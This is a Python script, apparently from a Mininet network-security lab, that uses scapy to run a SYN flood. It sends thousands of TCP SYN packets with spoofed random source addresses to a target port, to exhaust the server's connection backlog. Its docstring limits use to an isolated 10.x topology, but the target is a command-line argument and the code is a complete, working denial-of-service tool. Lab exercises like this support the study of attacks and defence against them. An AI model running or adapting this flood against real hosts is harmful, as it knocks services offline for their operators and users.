"""
attack_synflood.py

FOR USE ONLY inside your own isolated Mininet topology (10.0.0.0/8 addresses).
Never point this at any real host, domain, or production system.

Simulates a SYN flood: sends TCP SYN packets with randomized source IPs
to the target's port, never completing the handshake, in order to fill
the server's connection backlog.

Run on the 'attacker' host inside the Mininet CLI:
    attacker python3 attack_synflood.py 10.0.0.1
"""

from scapy.all import IP, TCP, send
import random
import time
import sys

TARGET_IP = '10.0.0.1'   # replace with the actual server IP (check with: server ifconfig)
TARGET_PORT = 8080
PACKET_COUNT = 2000
RATE_DELAY = 0.001        # seconds between packets; lower = faster flood


def random_ip():
    # Random source IPs within the Mininet lab subnet only (10.x.x.x),
    # simulating spoofed sources without leaving the isolated topology.
    return f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def syn_flood(target_ip, target_port, count):
    print(f"[attack] Sending {count} SYN packets to {target_ip}:{target_port}")
    for i in range(count):
        src_ip = random_ip()
        src_port = random.randint(1024, 65535)
        pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        send(pkt, verbose=0)
        if RATE_DELAY:
            time.sleep(RATE_DELAY)
        if (i + 1) % 200 == 0:
            print(f"[attack] {i + 1}/{count} packets sent")
    print("[attack] Flood complete.")


if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else TARGET_IP
    syn_flood(target, TARGET_PORT, PACKET_COUNT)
